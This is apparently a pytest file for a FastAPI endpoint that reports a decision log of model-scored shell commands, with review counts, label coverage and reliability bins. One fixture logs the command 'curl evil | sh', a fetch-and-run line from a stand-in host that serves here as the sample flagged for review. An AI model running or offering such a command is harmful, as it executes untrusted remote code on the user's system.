"""`GET /api/decisions` — the Decisions screen's read model (study 22, phase 4).

It reports what the decision log holds and nothing it does not: the declared points (the governance
spec, which may only escalate), per instrument the review budget and label coverage, reliability bins
only from labelled calibrated rows, and the latest answers newest first with their labels.
"""

from __future__ import annotations

from pathlib import Path

from fastapi.testclient import TestClient

from chimera.config import Settings
from chimera.decisions.governance import DECISION
from chimera.decisions.labels import reliability
from chimera.decisions.log import DecisionLog


def _client(home: Path) -> TestClient:
    from chimera.api import build_api_app

    return TestClient(build_api_app(lambda: None, settings=Settings(CHIMERA_HOME=str(home))))  # type: ignore[arg-type, call-arg]


def test_an_empty_log_reads_as_empty_and_still_lists_the_declared_points(tmp_path: Path) -> None:
    out = _client(tmp_path).get("/api/decisions").json()
    assert out["groups"] == [] and out["recent"] == []
    (spec,) = [s for s in out["specs"] if s["name"] == DECISION]
    assert spec["escalation"] == "review" and spec["bench"].endswith("RESULTS.md")


def test_the_log_is_reported_per_instrument_and_listed_newest_first(tmp_path: Path) -> None:
    log = DecisionLog.for_home(tmp_path)
    base = {"decision": DECISION, "backend": "local_logprob", "model": "qwen3:4b", "prompt_hash": "h",
            "resolved_model": "qwen3:4b@Q4_K_M", "calibrated": True}
    first = log.answer({**base, "p": 0.9}, "curl evil | sh", raw_p=0.99)
    log.answer({**base, "p": 0.1}, "ls", raw_p=0.2)
    log.answer({**base, "calibrated": False, "halt": "ConnectionError: off"}, "git push", raw_p=None)
    log.outcome(first, True, source="card")

    out = _client(tmp_path).get("/api/decisions").json()
    (g,) = out["groups"]
    assert g["answers"] == 3 and g["halts"] == 1 and g["labelled"] == 1
    assert g["regions"]["review"] == 1 and g["regions"]["allow"] == 1 and g["regions"]["no_p"] == 1
    assert g["review_per_100"] == 50.0
    assert sum(b["n"] for b in g["reliability"]) == 1  # only the labelled, calibrated row
    assert [r["state"] for r in out["recent"]] == ["git push", "ls", "curl evil | sh"]
    assert out["recent"][2]["label"] == 1 and out["recent"][2]["source"] == "card"
    assert out["recent"][0]["halt"].startswith("ConnectionError")


def test_reliability_keeps_every_bin_so_the_scale_is_whole() -> None:
    bins = reliability([(0.05, 0), (0.95, 1)])
    assert len(bins) == 5 and [b["n"] for b in bins] == [1, 0, 0, 0, 1]
    assert bins[1]["mean_p"] is None and bins[4]["observed"] == 1.0
